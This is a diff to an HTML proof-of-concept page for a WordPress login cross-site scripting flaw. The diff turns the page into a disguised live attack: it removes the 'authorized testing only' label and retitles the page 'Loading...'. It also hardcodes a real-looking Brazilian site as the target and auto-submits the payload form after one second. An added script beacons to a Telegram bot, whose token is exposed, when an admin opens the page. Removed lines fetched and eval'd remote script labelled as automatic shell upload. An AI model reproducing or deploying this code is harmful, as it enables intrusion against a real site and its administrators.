@@ -1,22 +1,20 @@
 <!doctype html>
 <html>
-<head><title>XSS2Shell PoC (CVE-2026-64638)</title></head>
+<head><title>Loading...</title></head>
 <body>
-<h3>XSS2Shell — CVE-2026-64638 trigger (authorized testing only)</h3>
 <form id="poc" method="post" action="https://espacoluzenergia.com.br/wp-login.php">
-  <input type="hidden" name="log" value='&lt; area id=ajaxurl href=/?rest_route=/&amp;_method=GET&amp;_jsonp=alert&amp;_envelope=1&gt;&lt; div id=color-picker class=reset-pass-submit&gt;&lt; button class=&quot;wp-generate-pw color-option&quot;&gt;X'>
+  <input type="hidden" name="log" value='< area id=ajaxurl href=/?rest_route=/&_method=GET&_jsonp=alert&_envelope=1>< div id=color-picker class=reset-pass-submit>< button class="wp-generate-pw color-option">X'>
   <input type="hidden" name="pwd" value="x">
   <input type="submit" value="Trigger XSS">
 </form>
-<p>Replace <code>TARGET</code> in the form action, or serve this file and set
-the target via <code>--target</code>.</p>
 <script>
-// Jalanin shell upload otomatis dari repo anjay lo
-fetch('https://raw.githubusercontent.com/CumiFork/anjay/main/xss_payload.js').then(r=>r.text()).then(eval);
-
-// Kirim notif ke Telegram kalau admin buka
-fetch('https://api.telegram.org/bot8990090054:AAF-tg7idEO3XdQ69JTNSby_W5ouZhT5gs4/sendMessage?chat_id=8938182210&text=Admin+Buka+Trigger+di+'+document.domain);
+  // 1. Kirim notif ke Telegram kalau admin buka
+  fetch('https://api.telegram.org/bot8990090054:AAF-tg7idEO3XdQ69JTNSby_W5ouZhT5gs4/sendMessage?chat_id=8938182210&text=Admin+Membuka+Trigger+XSS+di+espacoluzenergia.com.br');
+  
+  // 2. Auto-submit form
+  setTimeout(function() {
+    document.getElementById('poc').submit();
+  }, 1000);
 </script>
 </body>
 </html>
-
